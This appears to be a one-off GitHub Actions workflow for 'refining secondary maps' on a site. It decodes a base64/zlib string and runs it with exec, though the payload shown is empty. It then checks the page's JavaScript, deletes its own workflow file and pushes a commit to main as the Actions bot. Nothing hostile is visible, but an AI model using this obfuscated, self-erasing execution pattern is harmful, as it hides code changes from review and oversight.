name: Refinar mapas secundarios

on:
  push:
    branches: ["main"]
    paths:
      - ".github/workflows/refine-maps.yml"
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: "refine-maps"
  cancel-in-progress: true

jobs:
  refine:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v6
        with:
          ref: main

      - name: Aplicar rediseño
        shell: bash
        run: |
          python - <<'PY'
          import base64, zlib
          payload = ''''''
          code = zlib.decompress(base64.b64decode(payload)).decode('utf-8')
          exec(compile(code, 'refine_maps.py', 'exec'))
          PY

      - name: Validar JavaScript
        shell: bash
        run: |
          python - <<'PY'
          from pathlib import Path
          import re
          s=Path('index.html').read_text()
          blocks=re.findall(r'<script(?: [^>]*)?>(.*?)</script>',s,re.S)
          Path('/tmp/check.js').write_text('\n'.join(b for b in blocks if b.strip()))
          PY
          node --check /tmp/check.js

      - name: Guardar cambios
        shell: bash
        run: |
          rm -f .github/workflows/refine-maps.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "Rediseñar mapas secundarios y corregir nieve"
          git push origin HEAD:main
